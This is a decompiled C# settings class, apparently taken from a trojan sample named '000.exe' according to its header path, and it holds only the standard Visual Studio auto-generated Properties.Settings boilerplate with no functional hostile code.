// Decompiled with JetBrains decompiler
// Type: zerozerozero.Properties.Settings
// Assembly: 000, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13F43A77-4E8B-438F-A69A-882CC6C087E6
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\000\000.exe

using System.CodeDom.Compiler;
using System.Configuration;
using System.Runtime.CompilerServices;

#nullable disable
namespace zerozerozero.Properties;

[CompilerGenerated]
[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "14.0.0.0")]
internal sealed class Settings : ApplicationSettingsBase
{
  private static Settings defaultInstance = (Settings) SettingsBase.Synchronized((SettingsBase) new Settings());

  public static Settings Default
  {
    get
    {
      Settings defaultInstance = Settings.defaultInstance;
      return defaultInstance;
    }
  }
}
